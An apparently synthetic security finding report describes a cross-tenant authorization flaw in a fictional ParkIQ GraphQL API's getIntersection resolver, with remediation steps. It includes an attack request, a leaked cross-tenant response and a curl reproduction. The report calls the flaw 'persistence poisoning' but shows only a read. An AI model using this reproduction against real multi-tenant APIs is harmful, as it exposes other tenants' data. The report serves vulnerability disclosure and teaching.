# Security Analysis Report
**System:** ParkIQ Management API
**Domain:** Parking / Smart City
**Example ID:** GQL-0300
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | Integrity — Pattern 4.2 | Persistence poisoning via lifecycle action on `getIntersection` — attacker from `tenant-c506` reads smart city intersection records owned by `tenant-d195` |

---

## Finding 1 — Integrity: Persistence Poisoning via Lifecycle Action (Pattern 4.2)

### Summary
The `getIntersection` resolver on ParkIQ Management API (`api.parkiq-management-ap.example.com`) fetches intersection control data by `nodeId` only. The resolver does NOT verify that the fetched object's `tenantId` matches the JWT's `tenantId` claim (§4.0). Per §5.0 Pattern 4.2, an attacker who can read or write intersection records can poison persisted state (e.g., traffic/parking control commands) for another tenant's smart city infrastructure. The Redis cache is keyed by `nodeId` only (no tenant dimension), creating a cache poisoning risk.

**Note:** HAR request operation (`getIntersection`) and response JSON key (`getIntersection`) are consistent.
**Note on `x-request-id`:** This appears as a *response* header (`"x-request-id": "req-c506d195"`). It is server-assigned and must NOT be sent as a request header.

**Pattern:** 4.2 — Persistence poisoning via lifecycle actions (Integrity)
**Affected resolver:** `getIntersection`
**Affected endpoint:** `POST https://api.parkiq-management-ap.example.com/graphql`

### Evidence from HAR (§6.0)

**Request — Attack (attacker JWT: `tenant-c506`)**
```
POST https://api.parkiq-management-ap.example.com/graphql
authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
content-type: application/json
x-tenant-id: tenant-c506

{"query": "query VulnerableOp { getIntersection(id: \"I-2300\") { nodeId tenantId ownerId data { sensitiveField internalNotes } } }"}
```

**Response — Cross-Tenant Intersection Control Record Returned**
```json
{
  "data": {
    "getIntersection": {
      "tenantId": "tenant-d195",
      "ownerId": "other-user-c506d195",
      "data": {
        "sensitiveField": "CONFIDENTIAL-c506d195",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```
*`x-request-id: req-c506d195` — server-assigned response header, confirms cross-tenant access.*

### Steps to Reproduce
```bash
curl -s -X POST "https://api.parkiq-management-ap.example.com/graphql" \
  -H "authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "content-type: application/json" \
  -H "x-tenant-id: tenant-c506" \
  -d '{"query": "query VulnerableOp { getIntersection(id: \"I-2300\") { nodeId tenantId ownerId data { sensitiveField internalNotes } } }"}'
# Vulnerable: tenantId: tenant-d195 returned for tenant-c506 caller
# Secure: {"errors":[{"message":"Forbidden"}]}
```

### Remediation
1. In `getIntersection` resolver: `if (intersection.tenantId !== jwt.tenantId) throw ForbiddenError`.
2. Key Redis cache on `tenantId:nodeId` composite, not `nodeId` alone (prevents cache poisoning of other tenants' intersection states).
3. Apply row-level security: `WHERE tenant_id = $jwt_tenant_id`.
